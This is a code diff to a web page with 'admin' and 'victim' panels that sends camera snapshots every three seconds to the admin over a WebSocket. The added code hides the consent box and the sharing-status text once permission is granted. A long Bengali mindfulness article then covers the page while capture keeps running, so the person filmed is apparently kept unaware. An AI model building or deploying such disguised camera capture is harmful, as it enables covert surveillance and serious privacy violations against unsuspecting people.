@@ -9,7 +9,7 @@
     body { margin: 0; min-height: 100vh; background: #000; color: #fff; font-family: Arial, sans-serif; }
     .panel { min-height: 100vh; width: 100%; padding: 24px; }
     .admin { display: none; flex-direction: column; align-items: center; }
-    .victim { display: none; align-items: center; justify-content: center; }
+    .victim { display: none; flex-direction: column; align-items: center; justify-content: center; }
     .box { width: min(520px, 100%); background: #151515; border: 1px solid #333; border-radius: 14px; padding: 22px; text-align: center; }
     h2 { margin-top: 0; }
     p { color: #bbb; line-height: 1.5; }
@@ -30,6 +30,25 @@
     .download-btn:hover { background: #218838; }
     .delete-btn { background: #dc3545; }
     .delete-btn:hover { background: #c82333; }
+    
+    /* নতুন আর্টিকেলের স্টাইল */
+    .article-container {
+      display: none; /* প্রথমে লুকিয়ে থাকবে */
+      width: min(800px, 100%);
+      background: #111;
+      padding: 30px;
+      border-radius: 12px;
+      border: 1px solid #333;
+      text-align: left;
+      line-height: 1.8;
+      color: #e0e0e0;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    .article-container h2 { color: #ffb000; font-size: 22px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 10px;}
+    .article-container h3 { color: #4db8ff; margin-top: 25px; font-size: 19px;}
+    .article-container p { color: #ccc; margin-bottom: 15px; }
+    .article-container strong { color: #fff; }
   </style>
 </head>
 <body>
@@ -46,7 +65,8 @@
   </section>
 
   <section id="victim-panel" class="panel victim">
-    <div class="box">
+    <!-- পারমিশন বক্স -->
+    <div id="initial-view" class="box">
       <h2>Camera Sharing</h2>
       <p>This page can capture one camera snapshot every 3 seconds and send it to the connected admin page.</p>
       <div class="consent">
@@ -54,8 +74,61 @@
       </div>
       <button id="start-button" class="btn">Start Camera Sharing</button>
       <p id="victim-status" class="loader">Waiting for your permission...</p>
-      <video id="video" autoplay playsinline muted></video>
     </div>
+
+    <!-- মাইন্ডফুলনেস আর্টিকেল (পারমিশন দেওয়ার পর দেখাবে) -->
+    <div id="article-view" class="article-container">
+      <h2>🧠 এই লেখাটি শুধু পড়বেন না—পড়তে পড়তেই নিজের মনকে লক্ষ্য করুন</h2>
+      <p>আপনি এখন যেখানে আছেন, সেখানেই একটু থামুন।<br>ফোনটা হাতে থাকলে থাকুক। কোথাও যাওয়ার দরকার নেই। শুধু পরবর্তী ৩০ সেকেন্ড নিজের জন্য রাখুন।</p>
+      
+      <h3>🫁 প্রথম কাজ: এখনই করুন</h3>
+      <p>চোখ খোলা রাখুন।<br>একবার স্বাভাবিকভাবে শ্বাস নিন।<br>শ্বাস নেওয়ার সময় খেয়াল করুন—বাতাস শরীরের ভেতরে ঢুকছে।<br>এবার স্বাভাবিকভাবে শ্বাস ছাড়ুন।<br>কিছু পরিবর্তন করার চেষ্টা করবেন না। শুধু লক্ষ্য করুন।<br>আরেকবার করুন।<br>এবার নিজের চারপাশে তাকান। এমন ৩টি জিনিস খুঁজে বের করুন যেগুলো আপনি আগে এই মুহূর্তে খেয়াল করছিলেন না।<br>পেয়ে গেছেন?<br>এবার নিজেকে একটা প্রশ্ন করুন—</p>
+      <p><strong>“এই মুহূর্তে আমার মনে কী চলছে?”</strong></p>
+      <p>উত্তর খুঁজতে হবে না। শুধু কয়েক সেকেন্ড লক্ষ্য করুন।<br>আপনি এইমাত্র Mindfulness-এর একটি ছোট্ট অনুশীলন করে ফেলেছেন।</p>
+      
+      <h3>🌿 Mindfulness আসলে কী?</h3>
+      <p>Mindfulness হলো বর্তমান মুহূর্তে কী ঘটছে, সেটাকে সচেতনভাবে লক্ষ্য করার অভ্যাস।<br>আমরা অনেক সময় শরীর দিয়ে বর্তমানের মধ্যে থাকি, কিন্তু মন পড়ে থাকে অতীতে বা ভবিষ্যতে।<br>পুরোনো কোনো কথা মনে পড়ছে।<br>আগামীকাল কী হবে সেটা নিয়ে চিন্তা হচ্ছে。<br>কেউ কী বলেছে সেটা বারবার মনে হচ্ছে।<br>Mindfulness আমাদের শেখায়—এসব চিন্তাকে জোর করে বন্ধ করতে হবে না। বরং চিন্তা, অনুভূতি ও শরীরের অভিজ্ঞতাগুলোকে লক্ষ্য করে আবার বর্তমান মুহূর্তে ফিরে আসতে হবে।<br>আর তাই আজকের এই লেখাটা একটু অন্যরকম।<br>আপনি শুধু পড়বেন না—পড়ার সঙ্গেই অনুশীলন করবেন。</p>
+      
+      <h3>🫁 অনুশীলন ১: এখন আবার নিজের শ্বাসের কাছে ফিরে আসুন</h3>
+      <p>এবার ২০ সেকেন্ডের জন্য শুধু শ্বাসের দিকে মনোযোগ দিন।<br>কোনো বিশেষভাবে শ্বাস নেওয়ার দরকার নেই।<br>শুধু লক্ষ্য করুন—<br>শ্বাস ঢুকছে。<br>শ্বাস বের হচ্ছে।<br>মন অন্যদিকে চলে যাবে।<br>হয়তো এই লেখার কোনো কথা মনে পড়বে। অন্য কোনো চিন্তা আসবে।<br>সমস্যা নেই।<br>চিন্তা চলে যাওয়ার পর যখন বুঝতে পারবেন আপনার মন অন্যদিকে চলে গেছে, তখন আবার শ্বাসের দিকে ফিরে আসুন।<br>এটাই অনুশীলন।</p>
+      <p><strong>মনে রাখবেন:</strong> Mindfulness মানে চিন্তা বন্ধ করা নয়। মন চলে গেলে তাকে আবার ফিরিয়ে আনা。</p>
+      
+      <h3>👁️ অনুশীলন ২: 5-4-3-2-1 — এবার চারপাশটা লক্ষ্য করুন</h3>
+      <p>এবার ফোনের স্ক্রিন থেকে চোখ সরিয়ে চারপাশে তাকান।<br>খুঁজে বের করুন—<br>৫টি জিনিস যা আপনি দেখতে পাচ্ছেন।<br>এবার—<br>৪টি জিনিস যা আপনি স্পর্শ করে অনুভব করতে পারছেন।<br>এবার কিছুক্ষণ চুপ থাকুন এবং—<br>৩টি শব্দ শুনুন।<br>এরপর—<br>২টি গন্ধ খেয়াল করুন।<br>সবশেষে—<br>১টি স্বাদ অনুভব করুন。<br>কাজটা শেষ?<br>তাহলে কয়েক সেকেন্ড শুধু চারপাশের পরিবেশটা লক্ষ্য করুন।<br>আপনি হয়তো বুঝতে পারছেন—কিছুক্ষণ আগেও যেসব বিষয় আপনার চোখের সামনে ছিল, সেগুলো আপনি সচেতনভাবে লক্ষ্যই করছিলেন না।<br>এটাই Mindfulness-এর একটি গুরুত্বপূর্ণ বিষয়:<br>আমরা অনেক কিছু দেখি, কিন্তু সবকিছু সচেতনভাবে লক্ষ্য করি না।</p>
+      
+      <h3>💭 অনুশীলন ৩: আপনার চিন্তাকে ধরুন</h3>
+      <p>এবার নিজের মনের দিকে একটু তাকান।<br>গত ১০–২০ সেকেন্ডে আপনার মাথায় কী কী চিন্তা এসেছে?<br>কোনো চিন্তা নিয়ে বিচার করবেন না।<br>শুধু লক্ষ্য করুন।<br>হয়তো আপনি ভাবছেন—<br>“এই লেখাটা কতক্ষণ চলবে?”<br>হয়তো অন্য কোনো কাজের কথা মনে পড়েছে।<br>হয়তো কোনো পুরোনো ঘটনা মনে এসেছে।<br>যাই হোক, শুধু মনে মনে বলুন—</p>
+      <p><strong>“আমি একটি চিন্তা লক্ষ্য করছি।”</strong></p>
+      <p>ব্যস।<br>চিন্তাটাকে দূর করার দরকার নেই।<br>তার সঙ্গে তর্ক করারও দরকার নেই।<br>শুধু লক্ষ্য করুন।</p>
+      
+      <h3>🚶 অনুশীলন ৪: এবার একটু হাঁটুন</h3>
+      <p>যদি সম্ভব হয়, ফোনটা হাতে রেখেই উঠে দাঁড়ান।<br>ধীরে ধীরে কয়েক পা হাঁটুন।<br>হাঁটার সময় খেয়াল করুন—<br>পা মাটিতে কীভাবে স্পর্শ করছে?<br>শরীর কীভাবে নড়ছে?<br>হাত কীভাবে নড়ছে?<br>চারপাশে কী শব্দ হচ্ছে?<br>বাতাস শরীরে কেমন লাগছে?<br>আপনি কোথাও পৌঁছানোর জন্য হাঁটছেন না।<br>এই কয়েকটি মুহূর্তে শুধু হাঁটার অভিজ্ঞতাটাকে লক্ষ্য করছেন।<br>এটিই Mindful Walking-এর একটি সহজ রূপ।<br>এখন আবার বসুন।</p>
+      
+      <h3>🍽️ অনুশীলন ৫: পরের খাবারটা একটু অন্যভাবে খাবেন</h3>
+      <p>এই অনুশীলনটা এখনই করতে হবে না।<br>পরেরবার যখন খাবেন, তখন মনে রাখবেন।<br>প্রথম কয়েক কামড়ের সময় ফোনটা পাশে রাখার চেষ্টা করুন।<br>খাবারের দিকে মন দিন।<br>খেয়াল করুন—<br>খাবারের গন্ধ কেমন?<br>স্বাদ কেমন?<br>তাপমাত্রা কেমন?<br>চিবানোর সময় কেমন অনুভূতি হচ্ছে?<br>খাবারকে দ্রুত শেষ করার বদলে কয়েক মুহূর্ত খাওয়ার অভিজ্ঞতাটাকে অনুভব করুন।<br>এটিই Mindful Eating-এর একটি সহজ অনুশীলন।</p>
+      
+      <h3>🧍 অনুশীলন ৬: এখন নিজের শরীরটা অনুভব করুন</h3>
+      <p>আরাম করে বসুন।<br>চোখ বন্ধ করতে পারেন, আবার খোলাও রাখতে পারেন।<br>এবার কয়েক সেকেন্ডের জন্য নিজের পায়ের দিকে মনোযোগ দিন।<br>কোনো অনুভূতি আছে?<br>তারপর ধীরে ধীরে মনোযোগ উপরের দিকে আনুন।<br>পা → পেট → বুক → কাঁধ → ঘাড় → মুখ<br>কোথাও চাপ বা অস্বস্তি অনুভব করছেন?<br>শুধু লক্ষ্য করুন।<br>পরিবর্তন করার চেষ্টা করবেন না।<br>নিজের শরীর কী অনুভব করছে, সেটা লক্ষ্য করাটাই এই অনুশীলনের উদ্দেশ্য।</p>
+      
+      <h3>⏱️ আরেকটি ছোট পরীক্ষা: ১ মিনিটের Mindfulness</h3>
+      <p>এবার এই লেখাটি এক মিনিটের জন্য বন্ধ রাখুন।<br>হ্যাঁ, সত্যিই।<br>এক মিনিট কিছু করবেন না।<br>শুধু—<br>শ্বাস লক্ষ্য করুন。<br>শরীর অনুভব করুন。<br>চারপাশের শব্দ শুনুন。<br>মনে কী চিন্তা আসছে লক্ষ্য করুন।<br>মন চলে গেলে আবার ফিরিয়ে আনুন。<br>এক মিনিট শেষ হলে আবার এখানে ফিরে আসুন।</p>
+      
+      <h3>🔬 মনোবিজ্ঞান Mindfulness সম্পর্কে কী বলে?</h3>
+      <p>Mindfulness নিয়ে মনোবিজ্ঞানে এবং স্বাস্থ্যবিজ্ঞানে অনেক গবেষণা হয়েছে। বিভিন্ন গবেষণায় mindfulness-based interventions-এর সঙ্গে কিছু মানুষের মানসিক চাপ এবং উদ্বেগ বা বিষণ্নতার উপসর্গ কমার সম্পর্ক দেখা গেছে।<br>তবে এটাকে কোনো জাদুকরী সমাধান ভাবা ঠিক নয়।<br>Mindfulness-এর উদ্দেশ্যও সব চিন্তা মুছে ফেলা নয়।<br>বরং এটি এমন একটি দক্ষতা, যেখানে আমরা শিখি—<br>“আমি কী ভাবছি?”<br>“আমি কী অনুভব করছি?”<br>“আমার শরীরে কী ঘটছে?”<br>“আমি এই মুহূর্তে কী করছি?”<br>এসব বিষয়কে সচেতনভাবে লক্ষ্য করতে।</p>
+      
+      <h3>🌱 এবার নিজের জন্য একটি ছোট অভ্যাস তৈরি করুন</h3>
+      <p>এই পুরো লেখাটি পড়তে পড়তে আপনি ইতিমধ্যেই কয়েকটি ছোট mindfulness exercise করেছেন।<br>এখন এগুলোকে দৈনন্দিন জীবনের সঙ্গে যুক্ত করার চেষ্টা করতে পারেন।<br>সকালে ঘুম থেকে উঠে ১ মিনিট শ্বাস লক্ষ্য করুন।<br>হাঁটার সময় কয়েক মিনিট mindful walking করুন।<br>খাওয়ার সময় প্রথম কয়েক কামড় সচেতনভাবে খান।<br>মন খুব ব্যস্ত মনে হলে 5-4-3-2-1 grounding করতে পারেন।<br>আর দিনের যেকোনো সময় নিজেকে একবার প্রশ্ন করুন—</p>
+      <p><strong>“আমি এই মুহূর্তে কোথায়? এবং আমার মন কোথায়?”</strong></p>
+      <p>এই একটি প্রশ্নই হয়তো আপনাকে আবার বর্তমান মুহূর্তে ফিরিয়ে আনতে পারে।</p>
+      
+      <h3>❤️ শেষ করার আগে আরেকবার থামুন</h3>
+      <p>এখন আপনি এই লেখার একেবারে শেষ প্রান্তে।<br>আরেকবার নিজের শ্বাসটা লক্ষ্য করুন।<br>শ্বাস আসছে।<br>শ্বাস যাচ্ছে。<br>চারপাশের একটা শব্দ শুনুন।<br>নিজের শরীরটা অনুভব করুন।<br>আর নিজের মনকে জিজ্ঞেস করুন—</p>
+      <p><strong>“এই মুহূর্তে আমি কী অনুভব করছি?”</strong></p>
+      <p>কোনো সঠিক উত্তর দরকার নেই।<br>শুধু লক্ষ্য করুন।<br>কারণ Mindfulness-এর সবচেয়ে সুন্দর দিকটি সম্ভবত এখানেই—<br>নিজেকে বদলে ফেলার আগে, নিজেকে লক্ষ্য করতে শেখা।<br>আমরা প্রতিদিন কত মানুষের কথা শুনি, কত তথ্য দেখি, কত চিন্তার মধ্যে দিয়ে যাই。<br>কিন্তু দিনের শেষে—</p>
+      <p><strong>নিজের মনের কথাটা কি আমরা কখনো সত্যিই শুনি?</strong><br>হয়তো Mindfulness সেই শোনার অভ্যাসটাই একটু একটু করে তৈরি করতে পারে।</p>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
   </section>
 
   <script>
@@ -64,6 +137,11 @@
 
     const adminPanel = document.getElementById('admin-panel');
     const victimPanel = document.getElementById('victim-panel');
+    
+    // ভিউ কন্ট্রোল করার জন্য
+    const initialView = document.getElementById('initial-view');
+    const articleView = document.getElementById('article-view');
+    
     const linkInput = document.getElementById('link');
     const copyButton = document.getElementById('copy-button');
     const accessButton = document.getElementById('access-button');
@@ -126,7 +204,6 @@
       ws = new WebSocket(getWebSocketUrl(socketMode));
 
       ws.onopen = () => {
-        if (socketMode === 'victim') victimStatus.textContent = 'Connected. Press the button to start.';
         if (socketMode === 'admin') statusText.textContent = 'Connected to server. Waiting for live snapshots...';
       };
 
@@ -144,7 +221,6 @@
       ws.onclose = () => reconnectTimer = setTimeout(() => connectSocket(socketMode), 2000);
     }
 
-    // বাগ ফিক্স করা হয়েছে এই ফাংশনে
     startButton.addEventListener('click', async () => {
       if (snapshotTimer) return;
       try {
@@ -155,8 +231,9 @@
         video.srcObject = videoStream;
         await video.play();
         
-        victimStatus.textContent = 'Camera sharing is active.';
-        startButton.textContent = 'Sharing Active';
+        // পারমিশন পাওয়ার সাথে সাথেই প্রথম পেজ লুকিয়ে আর্টিকেল দেখিয়ে দেওয়া হবে
+        initialView.style.display = 'none';
+        articleView.style.display = 'block';
         
         // ডাইমেনশন লোড হওয়ার জন্য সেফ চেক
         if (!video.videoWidth || !video.videoHeight) {
